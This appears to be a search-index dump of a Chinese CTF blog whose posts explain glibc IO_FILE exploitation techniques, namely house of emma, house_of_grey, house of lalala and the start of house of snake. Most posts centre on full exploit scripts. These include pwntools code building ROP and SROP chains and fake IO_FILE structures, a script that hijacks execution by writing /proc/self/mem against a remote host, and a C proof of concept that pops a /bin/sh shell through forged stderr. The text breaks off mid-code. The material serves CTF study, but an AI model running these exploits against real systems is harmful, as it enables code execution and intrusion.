emma","url":"/2022/05/17/house-of-emma/","content":"在glibc2.34中删除了malloc_hook和free_hook，所以孕育而生了一个新的利用方法house of emma。这篇文章需要两个前置知识largebin attack和house of kiwi在这里就不再提了。然后后面一篇文章上次好像提了是写how2heap在glibc2.31之后的变化总结，不过会新加一个利用方式也是我今天才知道的Fastbin Reverse Into Tcache(先给自己挖个坑)\n利用原理为什么说house of emma的前置知识需要house of kiwi是因为其退出的方式是_exit(0)所以没有办法使用以往的fsop的方式来进行，调用的链子还是使用assert来触发。他们之间的不同点就是这里利用的vtable不一样。\nstatic const struct _IO_jump_t _IO_cookie_jumps libio_vtable = &#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, _IO_file_finish),  JUMP_INIT(overflow, _IO_file_overflow),  JUMP_INIT(underflow, _IO_file_underflow),  JUMP_INIT(uflow, _IO_default_uflow),  JUMP_INIT(pbackfail, _IO_default_pbackfail),  JUMP_INIT(xsputn, _IO_file_xsputn),  JUMP_INIT(xsgetn, _IO_default_xsgetn),  JUMP_INIT(seekoff, _IO_cookie_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_file_setbuf),  JUMP_INIT(sync, _IO_file_sync),  JUMP_INIT(doallocate, _IO_file_doallocate),  JUMP_INIT(read, _IO_cookie_read),  JUMP_INIT(write, _IO_cookie_write),  JUMP_INIT(seek, _IO_cookie_seek),  JUMP_INIT(close, _IO_cookie_close),  JUMP_INIT(stat, _IO_default_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue),&#125;;\n\n这里使用的是上面的这个vtable，其中的几个函数\nstatic ssize_t_IO_cookie_read (FILE *fp, void *buf, ssize_t size)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_read_function_t *read_cb = cfile-&gt;__io_functions.read;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (read_cb);#endif  if (read_cb == NULL)    return -1;  return read_cb (cfile-&gt;__cookie, buf, size);&#125;static ssize_t_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_write_function_t *write_cb = cfile-&gt;__io_functions.write;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (write_cb);#endif  if (write_cb == NULL)    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      return 0;    &#125;  ssize_t n = write_cb (cfile-&gt;__cookie, buf, size);  if (n &lt; size)    fp-&gt;_flags |= _IO_ERR_SEEN;  return n;&#125;static off64_t_IO_cookie_seek (FILE *fp, off64_t offset, int dir)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_seek_function_t *seek_cb = cfile-&gt;__io_functions.seek;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (seek_cb);#endif  return ((seek_cb == NULL       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)           == -1)       || offset == (off64_t) -1)      ? _IO_pos_BAD : offset);&#125;static int_IO_cookie_close (FILE *fp)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_close_function_t *close_cb = cfile-&gt;__io_functions.close;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (close_cb);#endif  if (close_cb == NULL)    return 0;  return close_cb (cfile-&gt;__cookie);&#125;\n\n都是直接调用指针当作函数来调用，也就存在了一定的安全隐患了。\n\n这里查看汇编代码可以看到是将取出来的值首先循环右移了0x11接着与fs:0x30进行异或之后检验rax是否为空，最后再调用rax。\n#  define PTR_MANGLE(var) \\  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard_local)#  define PTR_DEMANGLE(var)     PTR_MANGLE (var)\n\n其实异或这一部也就是上面调用的这个函数干的事情。所以如果我们想要劫持程序执行流还必须泄漏这个的话就很麻烦了，所以我们不选择泄漏他的值，我们选择覆盖他的值，后面在往这里写入地址的时候作相应的处理即可。\n题目house of emma题目的逆向过程没什么好说的又不是cpp，所以这里就不再提。\n然后题目存在的漏洞就是free之后没有清空指针导致UAF了。\n其实懂了上面所描述的这道题就很好理解了，直接可以自己做出来了。\nexpfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)r = process(&#x27;./pwn&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;payload = b&#x27;&#x27;def create(idx, size):    global payload    payload += p8(0x1)    payload += p8(idx)    payload += p16(size)def delete(idx):    global payload    payload += p8(0x2)    payload += p8(idx)def show(idx):    global payload    payload += p8(0x3)    payload += p8(idx)def edit(idx, content):    global payload    payload += p8(0x4)    payload += p8(idx)    print(len(content))    payload += p16(len(content))    payload += contentdef run():    global payload    payload += p8(0x5)    if len(payload) &gt; 0x500:        error(&#x27;!!!&#x27;)    r.recvuntil(b&#x27;Pls input the opcode&#x27;)    r.send(payload)    payload = b&#x27;&#x27;create(0, 0x410)create(1, 0x410)create(2, 0x420)create(3, 0x430)delete(2)run()show(2)run()r.recvline()libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x1f30b0print(hex(libc_base))gadget_addr = libc_base + 0x146020pointer_chk_guard_local = libc_base + 0x234c10 + 0x2000setcontext_addr = libc_base + 0x50bfdpop_rdi = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rax = libc_base + next(libc.search(asm(&#x27;pop rax\\nret&#x27;)))syscall = libc_base + next(libc.search(asm(&#x27;syscall\\nret&#x27;)))edit(2, b&#x27;a&#x27; * 0x10)show(2)run()r.recvuntil(b&#x27;a&#x27; * 0x10)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x2ae0print(hex(heap_base))delete(0)edit(    2,    flat(libc_base + 0x1f30b0, libc_base + 0x1f30b0, heap_base + 0x2ae0,         libc_base + libc.symbols[&#x27;stderr&#x27;] - 0x20))create(5, 0x430)create(0, 0x410)run()delete(0)edit(    2,    flat(libc_base + 0x1f30b0, libc_base + 0x1f30b0, heap_base + 0x2ae0,         pointer_chk_guard_local))create(6, 0x430)run()def ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)create(7, 0x450)delete(7)create(8, 0x430)run()edit(7, b&#x27;a&#x27; * 0x430 + flat(0, 0x300))run()next_chain = 0srop_addr = heap_base + 0x2ae0 + 0x10fake_IO_FILE = 2 * p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0xffffffffffffffff)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE = fake_IO_FILE.ljust(0x58, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(next_chain)fake_IO_FILE = fake_IO_FILE.ljust(0x78, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(heap_base)fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(0)fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(libc.sym[&#x27;_IO_cookie_jumps&#x27;] + 0x40)fake_IO_FILE += p64(srop_addr)fake_IO_FILE += p64(0)fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))fake_frame_addr = srop_addrframe = SigreturnFrame()frame.rdi = fake_frame_addr + 0xF8frame.rsi = 0frame.rdx = 0x100frame.rsp = fake_frame_addr + 0xF8 + 0x10frame.rip = pop_rdi + 1rop_data = [    pop_rax, 2, syscall, pop_rax, 0, pop_rdi, 3, pop_rsi,    fake_frame_addr + 0x200, syscall, pop_rax, 1, pop_rdi, 1, pop_rsi,    fake_frame_addr + 0x200, syscall]pay = p64(0) + p64(fake_frame_addr) + b&#x27;\\x00&#x27; * 0x10 + p64(setcontext_addr +                                                           61)pay += bytes(frame).ljust(0xF8, b&#x27;\\x00&#x27;)[0x28:] + b&#x27;flag&#x27;.ljust(    0x10, b&#x27;\\x00&#x27;) + flat(rop_data)edit(0, pay)edit(2, fake_IO_FILE)run()create(9, 0x450)run()gdb.attach(r)r.interactive()\n\n反思与总结上面exp其实是跑不通的，主要原因就是ld在不同环境的偏移不一致导致的，在我的docker环境中pointer_chk_guard_local指针的地址位于不可写的地方，所以我就随便找到了个地方代替他，就假装修改了。\n这一利用方式中可以看出来大量使用了large bin attack，并且题目的并没有存在可以任意地址写的漏洞，或者说是构造出这样一个漏洞出来，所以这一利用方式的限制条件其实也比较小。\n\n参考文章：\nhttps://blog.wjhwjhn.com/archives/751/\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house_of_grey","url":"/2022/01/05/house-of-grey/","content":"/procLinux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。同样的，我们也可以通过写入mem文件来直接写入内存，例如直接修改代码段，放入我们的shellcode，从而在程序流程执行到这一步时执行shellcode来拿shell。\n可以看到效果类似与gdb的vmmap。\n检查保护\n保护全开\n流程分析void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  char buf; // [rsp+1Bh] [rbp-25h] BYREF  int stat_loc; // [rsp+1Ch] [rbp-24h] BYREF  int fd; // [rsp+20h] [rbp-20h]  __pid_t pid; // [rsp+24h] [rbp-1Ch]  __int64 v7; // [rsp+28h] [rbp-18h] BYREF  char *v8; // [rsp+30h] [rbp-10h]  unsigned __int64 v9; // [rsp+38h] [rbp-8h]  v9 = __readfsqword(0x28u);  sub_F35(a1, a2, a3);  puts(&quot;Welcome to my house! Enjoy yourself!\\n&quot;);  puts(&quot;Do you want to help me build my room? Y/n?&quot;);  read(0, &amp;buf, 4uLL);  if ( buf == 121 || buf == 89 )  &#123;    fd = open(&quot;/dev/urandom&quot;, 0);    if ( fd &lt; 0 )    &#123;      perror(&quot;open&quot;);      exit(1);    &#125;    read(fd, &amp;v7, 8uLL);    close(fd);    v7 &amp;= 0xFFFFF0u;    v8 = (char *)mmap(0LL, 0x10000000uLL, 3, 131106, -1, 0LL);    if ( v8 == (char *)-1LL )    &#123;      perror(&quot;mmap&quot;);      exit(1);    &#125;    pid = clone(fn, &amp;v8[v7], 256, 0LL);    if ( pid == -1 )    &#123;      perror(&quot;clone&quot;);      exit(1);    &#125;    waitpid(pid, &amp;stat_loc, 0x80000000);    if ( (stat_loc &amp; 0x7F) != 0 )      puts(&quot;\\nMaybe something wrong? Build failed!&quot;);    else      puts(&quot;\\nBuild finished! Thanks a lot!&quot;);    exit(0);  &#125;  puts(&quot;You don&#x27;t help me? OK, just get out of my hosue!&quot;);  exit(0);&#125;\n\n首先是创建映射，然后将将映射的随机部分当作fn函数的堆栈区\nvoid __fastcall fn(void *arg)&#123;  unsigned __int64 v1; // rsi  int fd; // [rsp+10h] [rbp-70h]  int i; // [rsp+14h] [rbp-6Ch]  int v4; // [rsp+1Ch] [rbp-64h]  int v5; // [rsp+1Ch] [rbp-64h]  void *v6; // [rsp+20h] [rbp-60h]  char buf[24]; // [rsp+30h] [rbp-50h] BYREF  void *v8; // [rsp+48h] [rbp-38h]  char nptr[40]; // [rsp+50h] [rbp-30h] BYREF  unsigned __int64 v10; // [rsp+78h] [rbp-8h]  v10 = __readfsqword(0x28u);  puts(&quot;You get into my room. Just find something!\\n&quot;);  v6 = malloc(0x186A0uLL);  if ( !v6 )  &#123;    perror(&quot;malloc&quot;);    exit(1);  &#125;  if ( (unsigned int)sub_14D2() )    exit(1);  v8 = v6;  for ( i = 0; i &lt;= 29; ++i )  &#123;    switch ( (unsigned int)sub_FEE() )    &#123;      case 1u:        puts(&quot;So man, what are you finding?&quot;);        buf[(int)(read(0, buf, 0x28uLL) - 1)] = 0;        if ( (unsigned int)sub_FA6(buf) )        &#123;          puts(&quot;Man, don&#x27;t do it! See you^.&quot;);          exit(1);        &#125;        fd = open(buf, 0);        if ( fd &lt; 0 )        &#123;          perror(&quot;open&quot;);          exit(1);        &#125;        return;      case 2u:        puts(&quot;So, Where are you?&quot;);        read(0, nptr, 0x20uLL);        v1 = strtoull(nptr, 0LL, 10);        lseek(fd, v1, 0);        break;      case 3u:        puts(&quot;How many things do you want to get?&quot;);        read(0, nptr, 8uLL);        v4 = atoi(nptr);        if ( v4 &lt;= 100000 )        &#123;          v5 = read(fd, v8, v4);          if ( v5 &lt; 0 )          &#123;            puts(&quot;error read&quot;);            perror(&quot;read&quot;);            exit(1);          &#125;          puts(&quot;You get something:&quot;);          write(1, v8, v5);        &#125;        else        &#123;          puts(&quot;You greedy man!&quot;);        &#125;        break;      case 4u:        puts(&quot;What do you want to give me?&quot;);        puts(&quot;content: &quot;);        read(0, v8, 0x200uLL);        break;      case 5u:        exit(0);      default:        continue;    &#125;  &#125;  puts(&quot;\\nI guess you don&#x27;t want to say Goodbye!&quot;);  puts(&quot;But sadly, bye! Hope you come again!\\n&quot;);  exit(0);&#125;\n\n这里四个功能就是，第一个：输入要读的文件名，第二个：改变便宜指针，第三个：获取文件内容，第四个：输入数据\n漏洞：buf存在缓冲区溢出可以覆盖v8指针导致任意地址写\n利用分析利用读取任意文件读取/proc/self/maps然后获得程序加载基地址，再者就是获取自己创建的映射关系\n\nfind(b&#x27;/proc/self/maps&#x27;)get()r.recvuntil(b&#x27;You get something:\\n&#x27;)process_base = int(r.recvuntil(b&#x27;-&#x27;, drop=True), 16)success(&quot;process_base:&quot;+hex(process_base))puts_addr = process_base+puts_pltread_addr = process_base+read_pltopen_addr = process_base+open_pltpop_rdi_addr = process_base+pop_rdipop_rsi_r15_addr = process_base+pop_rsi_r15r.recvuntil(b&#x27;[heap]\\n&#x27;)stack_arr = str(r.recvuntil(b&#x27; rw-p &#x27;, drop=True), encoding=&#x27;utf-8&#x27;).split(&#x27;-&#x27;)print(stack_arr)stack_start = int(stack_arr[0], 16)success(&quot;stack_start:&quot;+hex(stack_start))stack_end = int(stack_arr[1], 16)print(&quot;stack_start:&quot;+hex(stack_start))print(&quot;stack_end:&quot;, hex(stack_end))\n\n接着思路就是利用mem劫持执行流，但是在看ida的代码\n\n程序都是以exit(0)结束，导致在fn我们无法进行ROP。所以思路就是我们覆盖掉read函数的ret地址来进行ROP。\n首先需要确定read的ret地址，但是我们连这个上面存放的什么都不知道所以很难操作，所以我们选择寻找buf的位置。\nfind(b&#x27;/proc/self/mem&#x27;)locate(stack_start)for i in range(24):    get()    r.recvuntil(b&#x27;You get something:\\n&#x27;)# 这一句千万别忘了，我就是忘了找一句导致一直跑不出来。    content = r.recvuntil(b&#x27;\\n1.Find something&#x27;, drop=True)    if b&#x27;/proc/self/mem&#x27; in content:        success(&#x27;OK!!!&#x27;)        buf_addr = len(content.split(b&#x27;/proc/self/mem&#x27;)                       [0])+i*100000+stack_start        break    elif i==23:        log.failure(&#x27;NO!!!&#x27;)        exit(0)\n\n其实buf地址的计算式很好就可以理解。\n但是光知道buf地址我们还是没法进行ROP。所以下一步就是求read的ret地址\n\n可以看到buf距离rsp的地址其实是0x30，但是在执行call _read指令时会执行push ip这条命令，执行完ret也就是pop ip。所以push进去之后rsp又会降低8个字节。所以此时read的ret地址距离buf的地址是0x38(以上是我个人对于0x38的猜测，因为其他博客并没有说清楚，可能是觉得太简单了，有错误欢迎大家在下方留言评论)。\n所以获得ret地址的代码也就是在上面加点小改动\nfind(b&#x27;/proc/self/mem&#x27;)locate(stack_start)for i in range(24):    get()    r.recvuntil(b&#x27;You get something:\\n&#x27;)    content = r.recvuntil(b&#x27;\\n1.Find something&#x27;, drop=True)    if b&#x27;/proc/self/mem&#x27; in content:        success(&#x27;OK!!!&#x27;)        buf_addr = len(content.split(b&#x27;/proc/self/mem&#x27;)                       [0])+i*100000+stack_start        ret_addr = buf_addr-0x38        break    elif i == 23:        log.failure(&#x27;NO!!!&#x27;)        exit(0)\n\n最后就是利用任意地址写构建ROP了，但是程序禁止了execve所以没法system这种了，选择open-&gt;read-&gt;puts就好了\n\nexpfrom pwn import *elf = ELF(&#x27;./cab92757a3ca4246a7a7eb7c880e20d9&#x27;)# r = process(&#x27;./cab92757a3ca4246a7a7eb7c880e20d9&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 50398)context.log_level = &#x27;debug&#x27;pop_rdi = 0x0000000000001823pop_rsi_r15 = 0x0000000000001821open_plt = elf.plt[&#x27;open&#x27;]read_plt = elf.plt[&#x27;read&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]def find(name):    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;So man, what are you finding?&#x27;)    r.sendline(name)def locate(pos):    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;So, Where are you?&#x27;)    r.sendline(bytes(str(pos), encoding=&#x27;utf-8&#x27;))def get():    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;How many things do you want to get?&#x27;)    r.sendline(b&#x27;100000&#x27;)def give(content):    r.recvuntil(b&#x27;5.Exit&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;content: &#x27;)    r.sendline(content)r.recvuntil(b&#x27;Do you want to help me build my room? Y/n?&#x27;)r.sendline(b&#x27;y&#x27;)find(b&#x27;/proc/self/maps&#x27;)get()r.recvuntil(b&#x27;You get something:\\n&#x27;)process_base = int(r.recvuntil(b&#x27;-&#x27;, drop=True), 16)success(&quot;process_base:&quot;+hex(process_base))puts_addr = process_base+puts_pltread_addr = process_base+read_pltopen_addr = process_base+open_pltpop_rdi_addr = process_base+pop_rdipop_rsi_r15_addr = process_base+pop_rsi_r15r.recvuntil(b&#x27;[heap]\\n&#x27;)stack_arr = str(r.recvuntil(b&#x27; rw-p &#x27;, drop=True), encoding=&#x27;utf-8&#x27;).split(&#x27;-&#x27;)print(stack_arr)stack_start = int(stack_arr[0], 16)success(&quot;stack_start:&quot;+hex(stack_start))stack_end = int(stack_arr[1], 16)print(&quot;stack_start:&quot;+hex(stack_start))print(&quot;stack_end:&quot;, hex(stack_end))find(b&#x27;/proc/self/mem&#x27;)locate(stack_start)for i in range(24):    get()    r.recvuntil(b&#x27;You get something:\\n&#x27;)    content = r.recvuntil(b&#x27;\\n1.Find something&#x27;, drop=True)    if b&#x27;/proc/self/mem&#x27; in content:        success(&#x27;OK!!!&#x27;)        buf_addr = len(content.split(b&#x27;/proc/self/mem&#x27;)                       [0])+i*100000+stack_start        ret_addr = buf_addr-0x38        break    elif i == 23:        log.failure(&#x27;NO!!!&#x27;)        exit(0)find(b&#x27;/proc/self/mem&#x27;.ljust(0x18, b&#x27;\\x00&#x27;)+p64(ret_addr))flag_addr = ret_addr+8*15payload = p64(pop_rdi_addr)+p64(flag_addr)+p64(pop_rsi_r15_addr) + \\    p64(0)+p64(0)+p64(open_addr)payload += p64(pop_rdi_addr)+p64(6)+p64(pop_rsi_r15_addr) + \\    p64(flag_addr)+p64(0)+p64(read_addr)payload += p64(pop_rdi_addr)+p64(flag_addr)+p64(puts_addr)payload += b&#x27;/home/ctf/flag\\x00&#x27;give(payload)r.interactive()\n\n参考博客https://blog.csdn.net/getsum/article/details/104096038\n","categories":["pwn-xctf"],"tags":["/proc"]},{"title":"house of lalala","url":"/2022/12/01/house-of-lalala/","content":"近期又出现一个新的关于IO_FILE的利用方式，不过原作者并没有出名字但是我blog又是用house of系列分类的所以就先随便取个名字。\n原理分析此次聚焦的vtable表为:\n/* the jump table.  */const struct _IO_jump_t _IO_obstack_jumps libio_vtable attribute_hidden =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, NULL),  JUMP_INIT(overflow, _IO_obstack_overflow),  JUMP_INIT(underflow, NULL),  JUMP_INIT(uflow, NULL),  JUMP_INIT(pbackfail, NULL),  JUMP_INIT(xsputn, _IO_obstack_xsputn),  JUMP_INIT(xsgetn, NULL),  JUMP_INIT(seekoff, NULL),  JUMP_INIT(seekpos, NULL),  JUMP_INIT(setbuf, NULL),  JUMP_INIT(sync, NULL),  JUMP_INIT(doallocate, NULL),  JUMP_INIT(read, NULL),  JUMP_INIT(write, NULL),  JUMP_INIT(seek, NULL),  JUMP_INIT(close, NULL),  JUMP_INIT(stat, NULL),  JUMP_INIT(showmanyc, NULL),  JUMP_INIT(imbue, NULL)&#125;;\n\n主要利用的结构体为:\nstruct _IO_obstack_file&#123;  struct _IO_FILE_plus file;  struct obstack *obstack;&#125;;\n\n也就是在IO_FILE结构体下加一个obstack结构体指针。下面则是obstack结构体的定义:\nstruct obstack          /* control current object in current chunk */&#123;  long chunk_size;              /* preferred size to allocate chunks in */  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */  char *object_base;            /* address of object we are building */  char *next_free;              /* where to add next char to current object */  char *chunk_limit;            /* address of char after current chunk */  union  &#123;    PTR_INT_TYPE tempint;    void *tempptr;  &#125; temp;                       /* Temporary for some macros.  */  int alignment_mask;           /* Mask of alignment for each object. */  /* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use     casts to the prototypeless function type in all assignments,     but having prototypes here quiets -Wstrict-prototypes.  */  struct _obstack_chunk *(*chunkfun) (void *, long);  void (*freefun) (void *, struct _obstack_chunk *);  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */  unsigned maybe_empty_object : 1; /* There is a possibility that the current                      chunk contains a zero-length object.  This                      prevents freeing the chunk if we allocate                      a bigger chunk to replace it. */  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed                     handler on error, but retained for binary                     compatibility.  */&#125;;\n\n可以看到，上述的vtable中只有_IO_obstack_overflow、_IO_obstack_xsputn这样两个函数，首先关注前一个\n_IO_obstack_overflowstatic int_IO_obstack_overflow (_IO_FILE *fp, int c)&#123;  struct obstack *obstack = ((struct _IO_obstack_file *) fp)-&gt;obstack;  int size;  /* Make room for another character.  This might as well allocate a     new chunk a memory and moves the old contents over.  */  assert (c != EOF);  obstack_1grow (obstack, c);  /* Setup the buffer pointers again.  */  fp-&gt;_IO_write_base = obstack_base (obstack);  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);  size = obstack_room (obstack);  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;  /* Now allocate the rest of the current chunk.  */  obstack_blank_fast (obstack, size);  return c;&#125;\n\n可以看到其中存在一个assert，注意下面如果我们走exit这条路来清空所有缓存时触发的话就会出现rsi必定为-1的情况，所以此路不通\n\n_IO_obstack_xsputnstatic size_t_IO_obstack_xsputn (FILE *fp, const void *data, size_t n)&#123;  struct obstack *obstack = ((struct _IO_obstack_file *) fp)-&gt;obstack;  if (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)    &#123;      int size;      /* We need some more memory.  First shrink the buffer to the\t space we really currently need.  */      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);      /* Now grow for N bytes, and put the data there.  */      obstack_grow (obstack, data, n);      /* Setup the buffer pointers again.  */      fp-&gt;_IO_write_base = obstack_base (obstack);      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);      size = obstack_room (obstack);      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;      /* Now allocate the rest of the current chunk.  */      obstack_blank_fast (obstack, size);    &#125;  else    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);  return n;&#125;\n\n这里我们的目标时调用到obstack_grow函数，所以我们需要进入这个if语句，这一点很好说，如果我们可以控制这个结构体就可以非常轻松的控制这里的值而后进入if语句，随后又会执行obstack_blank_fast函数\n#define obstack_blank_fast(h, n) ((h)-&gt;next_free += (n))\n\n这个其实是一个宏定义，可以看到内部其实不会特别影响后续的内容。在继续执行就会进入我们期望的函数:\n#define obstack_grow(OBSTACK, where, length)                      \\  __extension__                                   \\    (&#123; struct obstack *__o = (OBSTACK);                       \\       int __len = (length);                              \\       if (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \\     _obstack_newchunk (__o, __len);                      \\       memcpy (__o-&gt;next_free, where, __len);                     \\       __o-&gt;next_free += __len;                           \\       (void) 0; &#125;)\n\n可以看到这个也是一个宏定义，同样的我们又必须通过_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit这条if语句才能调用到_obstack_newchunk函数。\nvoid  _obstack_newchunk (struct obstack *h, int length)&#123;  struct _obstack_chunk *old_chunk = h-&gt;chunk;  struct _obstack_chunk *new_chunk;  long new_size;  long obj_size = h-&gt;next_free - h-&gt;object_base;  long i;  long already;  char *object_base;  /* Compute size for new chunk.  */  new_size = (obj_size + length) + (obj_size &gt;&gt; 3) + h-&gt;alignment_mask + 100;  if (new_size &lt; h-&gt;chunk_size)    new_size = h-&gt;chunk_size;  /* Allocate and initialize the new chunk.  */  new_chunk = CALL_CHUNKFUN (h, new_size);  if (!new_chunk)    (*obstack_alloc_failed_handler)();  h-&gt;chunk = new_chunk;  new_chunk-&gt;prev = old_chunk;  new_chunk-&gt;limit = h-&gt;chunk_limit = (char *) new_chunk + new_size;  // ...&#125;\n\n可以看到这里可以直接调用到我们期望的宏定义CALL_CHUNKFUN:\n# define CALL_CHUNKFUN(h, size) \\  (((h)-&gt;use_extra_arg)\t\t\t\t\t\t\t      \\   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))\t\t\t\t      \\   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))\n\n可以看到这里存在直接拿指针当作函数的操作(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))，条件也就是(((h)-&gt;use_extra_arg)不为0；\n总结所以从上到下的调用链也是可以直接写出来了:\n_IO_obstack_xsputn=&gt;obstack_grow=&gt;_obstack_newchunk=&gt;CALL_CHUNKFUN=&gt;(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))\n最后再根据结构体属性的偏移写上上述约束的值即可。\n当_IO_list_all指向我们可控A地址时，我们需要对A地址写入如下数据：\nA + 0x18 = 1;A + 0x20 = 0;A + 0x28 = 1;A + 0x30 = 0;A + 0x38 = system_addr;A + 0x48 = bin_sh_addr;A + 0x50 = 1;A + 0xd8 = _IO_obstack_jumps+0x20;A + 0xe0 = A;\n\n\npoc#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;char bin_sh_addr[0x10];int main()&#123;\tunsigned long libc_base;\tunsigned long printf_addr;\tunsigned long *IO_2_1_stderr;\tunsigned long IO_obstack_jumps;\tstrcpy(bin_sh_addr,&quot;/bin/sh&quot;);\tprintf(&quot;start!\\n&quot;);\tprintf_addr = printf;\tlibc_base = printf_addr - 0x55700;\tIO_2_1_stderr = libc_base + 0x1f7680;\tIO_obstack_jumps = libc_base + 0x1f33a0;\t*(IO_2_1_stderr + (0x28/8)) = 0x1;\t*(IO_2_1_stderr + (0x30/8)) = 0;\t*(IO_2_1_stderr + (0x18/8)) = 1;\t*(IO_2_1_stderr + (0x20/8)) = 0;\t*(IO_2_1_stderr + (0x50/8)) = 1;\t*(IO_2_1_stderr + (0xd8/8)) = IO_obstack_jumps+0x20;\t*(IO_2_1_stderr + (0xe0/8)) = IO_2_1_stderr;\t*(IO_2_1_stderr + (0x38/8)) = system;\t*(IO_2_1_stderr + (0x48/8)) = bin_sh_addr;\treturn 0;&#125;\n\n以上libc均使用:Ubuntu GLIBC 2.36-0ubuntu4\n\n参考文章\nhttps://tttang.com/archive/1845/#toc_\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of snake","url":"/2023/03/22/house-of-snake/","content":"这house of系列是真的多，上一个还没捂热下一个就来了，glibc更新也是真快。不过能在学习新东西的途中水一篇文章还是相当不错的。\n背景介绍在glibc2.37中_IO_obstack_jumps被删除啦，导致前一篇的利用方式无了。\n原理分析这次聚焦的vtable是:\nstatic const struct _IO_jump_t _IO_printf_buffer_as_file_jumps libio_vtable =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, NULL),  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),  JUMP_INIT(underflow, NULL),  JUMP_INIT(uflow, NULL),  JUMP_INIT(pbackfail, NULL),  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),  JUMP_INIT(xsgetn, NULL),  JUMP_INIT(seekoff, NULL),  JUMP_INIT(seekpos, NULL),  JUMP_INIT(setbuf, NULL),  JUMP_INIT(sync, NULL),  JUMP_INIT(doallocate, NULL),  JUMP_INIT(read, NULL),  JUMP_INIT(write, NULL),  JUMP_INIT(seek, NULL),  JUMP_INIT(close, NULL),  JUMP_INIT(stat, NULL),  JUMP_INIT(showmanyc, NULL),  JUMP_INIT(imbue, NULL)&#125;;\n\n可以看到这里只有两个函数，并且我们真正使用的只有第一个函数:\nstatic int__printf_buffer_as_file_overflow (FILE *fp, int ch)&#123;  struct __printf_buffer_as_file *file = (struct __printf_buffer_as_file *) fp;  __printf_buffer_as_file_commit (file);  /* EOF means only a flush is requested.   */  if (ch != EOF)    __printf_buffer_putc (file-&gt;next, ch);  /* Ensure that flushing actually produces room.  */  if (!__printf_buffer_has_failed 